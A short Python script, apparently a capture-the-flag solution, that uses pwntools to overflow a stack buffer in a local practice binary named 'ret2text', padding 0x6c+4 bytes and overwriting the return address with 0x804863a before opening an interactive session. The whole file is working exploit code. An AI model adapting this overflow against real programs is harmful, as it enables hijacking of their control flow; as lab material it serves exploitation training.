#!/usr/bin/env python
# coding=utf-8
from pwn import *

sh=process("./ret2text")
arg='a'*(0x6c+4)+p32(0x804863a)
sh.sendline(arg)
sh.interactive()

